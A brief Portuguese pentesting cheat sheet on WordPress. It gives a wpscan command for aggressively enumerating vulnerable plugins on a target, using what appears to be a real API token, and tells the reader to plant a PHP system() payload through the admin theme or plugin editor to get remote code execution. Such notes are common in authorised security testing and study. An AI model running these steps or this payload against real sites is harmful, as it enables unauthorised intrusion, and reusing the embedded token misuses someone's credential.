# Wordpress  

**Base de vulnerabilidades**
wpvulndb.com

## Ferramentas

### wpscan  

**Identificação de plugins vulneráveis com a API do WPScan**
`wpscan --url www.alvo.com.br -e vp --plugins-detection aggressive --api-token zBY8oaRacNAkSITVO2tKx4BZDbgjOsDiVjMqEntqkj4`

## Exploração

**RCE no painel administrativo**  
Busque por arquivo com permissões para edição no editor de temas ou plugins e inclua o payload em PHP.

`<?php system(id);?>`